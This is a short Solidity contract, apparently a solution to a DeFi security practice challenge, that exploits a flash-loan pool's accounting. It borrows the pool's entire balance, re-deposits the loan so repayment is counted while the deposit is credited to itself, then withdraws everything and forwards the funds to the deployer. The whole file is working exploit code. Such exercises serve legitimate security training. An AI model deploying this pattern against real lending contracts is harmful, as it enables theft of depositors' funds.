// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IPool {
    function flashLoan(uint256 amount) external;

    function deposit() external payable;

    function withdraw() external;
}

contract SideAttack {
    IPool immutable flashLoanContract;
    address immutable attacker;

    constructor(address _addr) {
        flashLoanContract = IPool(_addr);
        attacker = msg.sender;
    }

    function attack() external payable {
        flashLoanContract.flashLoan(address(flashLoanContract).balance);
        flashLoanContract.withdraw();
    }

    function execute() external payable {
        flashLoanContract.deposit{value: msg.value}();
    }

    receive() external payable {
        // payable(attacker).transfer(msg.value);
        payable(attacker).transfer(address(this).balance);
    }
}
